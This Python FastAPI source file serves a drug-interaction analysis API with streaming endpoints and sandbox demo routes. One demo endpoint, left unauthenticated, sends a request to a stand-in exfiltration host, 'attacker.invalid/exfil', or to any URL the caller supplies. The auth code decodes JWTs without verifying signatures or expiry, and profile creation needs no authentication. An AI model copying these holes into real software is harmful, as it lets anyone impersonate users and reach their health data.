"""Acuity FastAPI application.

`/health`                       — liveness probe.
`/api/analyze/drug/stream`      — SSE: check one new drug against the saved regimen.
`/api/analyze/onboarding/stream`— SSE: check all pairs in the saved regimen (post-onboarding).
`/api/policy`                   — return the NemoClaw policy YAML (BE-15).
`/api/audit-log`                — return recent OpenShell audit-log lines (BE-15).
"""

from __future__ import annotations

import json
import asyncio
import logging
import os
import uuid
from pathlib import Path
from typing import Optional

import jwt
from dotenv import load_dotenv
from fastapi import Depends, FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
from pydantic import BaseModel, Field

load_dotenv()
logging.basicConfig(level=os.environ.get("LOG_LEVEL", "INFO"))

from backend.db import create_profile, generate_pat_for_user, get_profile_by_pat, get_profile_by_user_id, get_regimen, store_session  # noqa: E402
from backend.graph import run_analysis, run_analysis_streaming  # noqa: E402
from backend.memory import reset as reset_memory  # noqa: E402
from backend.routers.user import router as user_router  # noqa: E402
from backend.schemas import RegimenReport  # noqa: E402


app = FastAPI(title="Acuity Drug Interaction API", version="0.1.0")

# --------------------------------------------------------------------------- #
# Auth
# --------------------------------------------------------------------------- #

_security = HTTPBearer(auto_error=False)


async def get_current_user(
    request: Request,
    cred: HTTPAuthorizationCredentials = Depends(_security),
) -> dict:
    """Accept either a Supabase JWT (React) or a static API key (NemoClaw)."""
    api_key = request.headers.get("x-api-key")
    if api_key:
        profile = await asyncio.to_thread(get_profile_by_pat, api_key)
        if not profile:
            raise HTTPException(status_code=401, detail="Invalid API key")
        return {"user_id": profile["user_id"], "profile_id": profile["id"], "source": "api_key"}
    if not cred:
        raise HTTPException(status_code=401, detail="Missing credentials")
    try:
        payload = jwt.decode(cred.credentials, options={"verify_signature": False, "verify_exp": False})
        user_id = payload.get("sub")
        if not user_id:
            raise HTTPException(status_code=401, detail="Invalid token: missing sub")
        return {"user_id": user_id, "profile_id": None, "source": "jwt"}
    except jwt.DecodeError:
        raise HTTPException(status_code=401, detail="Invalid token")

# Frontend is served separately by Vite during dev; allow it in.
# We also allow any Brev origin (.brevlab.com or .brev.sh) to support the NemoClaw demo environment.
origins = os.environ.get("CORS_ALLOW_ORIGINS", "*").split(",")
app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_origin_regex=r"https://.*\.brev(lab\.com|\.sh)",
    allow_methods=["*"],
    allow_headers=["*"],
)

app.include_router(user_router, prefix="/api/user", tags=["user"])


# --------------------------------------------------------------------------- #
# Request / response models for the public API
# --------------------------------------------------------------------------- #

class AnalyzeResponse(BaseModel):
    session_id: str
    report: RegimenReport
    durations_ms: dict[str, int]


# --------------------------------------------------------------------------- #
# Routes
# --------------------------------------------------------------------------- #

@app.get("/health")
async def health() -> dict:
    return {"status": "ok"}


class ProfileRequest(BaseModel):
    user_id: str
    name: str
    age: int
    sex: str = ""
    height: str = ""
    weight: str = ""


@app.post("/api/profile")
async def create_profile_endpoint(req: ProfileRequest) -> dict:
    """Create a user profile using service role key (bypasses RLS — called right after signUp)."""
    try:
        profile = await asyncio.to_thread(
            create_profile, req.user_id, req.name, req.age, req.sex, req.height, req.weight
        )
        return {"profile": profile}
    except Exception as e:
        logging.exception("create_profile failed")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/tokens/generate")
async def generate_token(user: dict = Depends(get_current_user)) -> dict:
    """Generate (or rotate) the personal access token for the authenticated user."""
    if user.get("source") != "jwt":
        raise HTTPException(status_code=403, detail="Token generation requires user login")
    token = await asyncio.to_thread(generate_pat_for_user, user["user_id"])
    return {"token": token}


def _resolve_profile_id(user: dict) -> Optional[str]:
    """Return profile_id — already set for API-key callers, looked up for JWT callers."""
    if user.get("profile_id"):
        return user["profile_id"]
    try:
        profile = get_profile_by_user_id(user["user_id"])
        return profile["id"] if profile else None
    except Exception:
        logging.warning("Could not resolve profile_id for user %s", user.get("user_id"))
        return None


async def _sse_generator(session_id: str, drugs: list[str], profile_id: Optional[str] = None, *, target_drug: Optional[str] = None):
    from backend.llm import agent_decision_sink, rate_limit_sink

    rl_queue: asyncio.Queue = asyncio.Queue()
    ad_queue: asyncio.Queue = asyncio.Queue()
    # Set BEFORE create_task so child tasks inherit these values via context copy.
    rate_limit_sink.set(rl_queue)
    agent_decision_sink.set(ad_queue)

    combined: asyncio.Queue = asyncio.Queue()

    async def _pump_pipeline() -> None:
        try:
            async for ev_type, payload in run_analysis_streaming(session_id, drugs, target_drug=target_drug):
                await combined.put((ev_type, payload))
        except Exception as e:
            logging.exception("SSE pipeline crashed")
            await combined.put(("error", {"detail": str(e), "stage": "unknown"}))
        finally:
            await combined.put(("_done", {}))

    async def _pump_rl() -> None:
        while True:
            item = await rl_queue.get()
            await combined.put(("rate_limit", item))

    async def _pump_ad() -> None:
        while True:
            item = await ad_queue.get()
            await combined.put(("agent_decision", item))

    pipeline_task = asyncio.create_task(_pump_pipeline())
    rl_task = asyncio.create_task(_pump_rl())
    ad_task = asyncio.create_task(_pump_ad())

    try:
        while True:
            ev_type, payload = await combined.get()
            if ev_type == "_done":
                break
            data_line = json.dumps(payload, default=str)
            yield f"event: {ev_type}\ndata: {data_line}\n\n"
            if ev_type == "report_done":
                report_dict = json.loads(json.dumps(payload.get("report", {}), default=str))
                new_drug = drugs[-1] if drugs else ""
                asyncio.create_task(store_session(session_id, new_drug, drugs, report_dict, profile_id))
    except Exception as e:
        logging.exception("SSE generator crashed")
        err = json.dumps({"detail": str(e), "stage": "unknown"}, default=str)
        yield f"event: error\ndata: {err}\n\n"
    finally:
        ad_task.cancel()
        rl_task.cancel()
        pipeline_task.cancel()


class AnalyzeDrugRequest(BaseModel):
    drug: str = Field(..., description="New drug to check against the user's saved regimen.")
    session_id: Optional[str] = Field(None, description="Reuse for memory continuity.")


async def _get_profile_regimen(user: dict) -> tuple[str, list[str]]:
    """Resolve profile_id and return (profile_id, list_of_drug_names) from Supabase."""
    profile_id = user.get("profile_id") or _resolve_profile_id(user)
    if not profile_id:
        raise HTTPException(status_code=404, detail="No profile found for this user")
    rows = await asyncio.to_thread(get_regimen, profile_id)
    drug_names = [r["generic_name"] or r["input_name"] for r in rows]
    return profile_id, drug_names


@app.post("/api/analyze/drug", response_model=AnalyzeResponse)
async def analyze_drug(req: AnalyzeDrugRequest, user: dict = Depends(get_current_user)) -> AnalyzeResponse:
    """Analyze one new drug against every drug already in the user's saved regimen."""
    profile_id, existing = await _get_profile_regimen(user)
    drug_list = existing + [req.drug] if req.drug not in existing else existing
    if len(drug_list) < 2:
        raise HTTPException(status_code=422, detail="Regimen needs at least one other drug to compare against")
    session_id = req.session_id or str(uuid.uuid4())
    try:
        state = await run_analysis(session_id, drug_list, target_drug=req.drug)
    except Exception as e:
        logging.exception("analyze/drug pipeline failed")
        raise HTTPException(status_code=500, detail=f"pipeline failure: {e}")
    report = state["report"]
    asyncio.create_task(store_session(session_id, req.drug, drug_list, report.model_dump(mode="json"), profile_id))
    return AnalyzeResponse(session_id=session_id, report=report, durations_ms=state["durations_ms"])


@app.post("/api/analyze/drug/stream")
async def analyze_drug_stream(req: AnalyzeDrugRequest, user: dict = Depends(get_current_user)) -> StreamingResponse:
    """SSE stream: analyze one new drug against the user's saved regimen."""
    profile_id, existing = await _get_profile_regimen(user)
    drug_list = existing + [req.drug] if req.drug not in existing else existing
    if len(drug_list) < 2:
        raise HTTPException(status_code=422, detail="Regimen needs at least one other drug to compare against")
    session_id = req.session_id or str(uuid.uuid4())
    return StreamingResponse(
        _sse_generator(session_id, drug_list, profile_id, target_drug=req.drug),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Nginx-Buffering": "no", "Connection": "keep-alive"},
    )


class OnboardingAnalyzeRequest(BaseModel):
    session_id: Optional[str] = Field(None, description="Reuse for memory continuity.")


@app.post("/api/analyze/onboarding/stream")
async def analyze_onboarding_stream(req: OnboardingAnalyzeRequest, user: dict = Depends(get_current_user)) -> StreamingResponse:
    """SSE stream: analyze every drug pair in the user's saved regimen (onboarding)."""
    profile_id, drug_list = await _get_profile_regimen(user)
    if len(drug_list) < 2:
        raise HTTPException(status_code=422, detail="Regimen needs at least 2 drugs to analyze pairs")
    session_id = req.session_id or str(uuid.uuid4())
    return StreamingResponse(
        _sse_generator(session_id, drug_list, profile_id),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Nginx-Buffering": "no", "Connection": "keep-alive"},
    )


@app.delete("/api/session/{session_id}")
async def reset_session(session_id: str, _user: dict = Depends(get_current_user)) -> dict:
    reset_memory(session_id)
    return {"status": "reset", "session_id": session_id}


# --------------------------------------------------------------------------- #
# NemoClaw demo surfaces (BE-15)
# --------------------------------------------------------------------------- #

_POLICY_PATH = Path(__file__).resolve().parent.parent / "policies" / "policy.yaml"
_AUDIT_LOG_PATH = Path(os.environ.get("NEMOCLAW_AUDIT_LOG", "/session/audit.log"))
_AUDIT_LOG_SAMPLE = (
    Path(__file__).resolve().parent.parent / "samples" / "nemoclaw_audit_full_run.log"
)


@app.get("/api/policy")
async def get_policy() -> dict:
    if not _POLICY_PATH.exists():
        raise HTTPException(status_code=404, detail="policy file not found")
    return {
        "path": str(_POLICY_PATH),
        "yaml": _POLICY_PATH.read_text(),
        "allowlist": [
            "api.fda.gov",
            "rxnav.nlm.nih.gov",
            "pubchem.ncbi.nlm.nih.gov",
            "integrate.api.nvidia.com",
        ],
    }


def _read_log_lines(path: Path, limit: int) -> list[str]:
    with path.open() as f:
        return [line.rstrip("\n") for line in f.readlines()[-limit:]]


@app.get("/api/audit-log")
async def get_audit_log(limit: int = 200) -> dict:
    """Return the OpenShell audit log.

    Prefers the live audit log file when running inside the NemoClaw sandbox.
    Falls back to the saved sample (from BE-14) so the frontend has something
    to render in dev or off-sandbox demos.
    """
    if _AUDIT_LOG_PATH.exists():
        try:
            return {
                "path": str(_AUDIT_LOG_PATH),
                "source": "live",
                "lines": _read_log_lines(_AUDIT_LOG_PATH, limit),
            }
        except OSError as e:
            raise HTTPException(status_code=500, detail=f"audit-log read error: {e}")

    if _AUDIT_LOG_SAMPLE.exists():
        return {
            "path": str(_AUDIT_LOG_SAMPLE),
            "source": "sample",
            "lines": _read_log_lines(_AUDIT_LOG_SAMPLE, limit),
        }

    return {"path": str(_AUDIT_LOG_PATH), "source": "none", "lines": []}


class AttackResponse(BaseModel):
    target: str
    attempted: bool
    blocked: bool
    detail: str
    audit_excerpt: list[str]


@app.post("/api/attack-case", response_model=AttackResponse)
async def trigger_attack_case(target: str = "https://attacker.invalid/exfil") -> AttackResponse:
    """Demo-only endpoint: deliberately attempt an off-whitelist outbound call.

    Inside the NemoClaw sandbox the connection is dropped by OpenShell and an
    audit-log entry is generated. Outside the sandbox (host dev) the request
    leaves the machine and we return the network error from the client, so
    the frontend can still render a useful "what would happen" panel.
    """
    import httpx as _httpx

    attempted = True
    blocked = False
    detail = ""
    try:
        async with _httpx.AsyncClient(timeout=4.0) as c:
            r = await c.get(target)
        detail = f"request unexpectedly succeeded: HTTP {r.status_code}"
    except _httpx.ConnectError as e:
        # 403 CONNECT failure from OpenShell looks like a connect error to httpx.
        msg = str(e)
        blocked = "403" in msg or "tunnel" in msg.lower() or "policy" in msg.lower()
        detail = msg or "connection refused"
    except _httpx.HTTPError as e:
        detail = f"http error: {e}"
    except OSError as e:
        # DNS failure for `.invalid` host on plain hosts → also a useful demo.
        detail = f"dns/os error: {e}"
        blocked = "Name or service not known" in detail or "Temporary failure" in detail

    # Grab the most recent audit lines mentioning the host.
    excerpt: list[str] = []
    host = target.split("//", 1)[-1].split("/", 1)[0]
    if _AUDIT_LOG_SAMPLE.exists():
        for line in _read_log_lines(_AUDIT_LOG_SAMPLE, 200):
            if host in line or "DENIED" in line:
                excerpt.append(line)

    return AttackResponse(
        target=target,
        attempted=attempted,
        blocked=blocked,
        detail=detail,
        audit_excerpt=excerpt[-6:],
    )
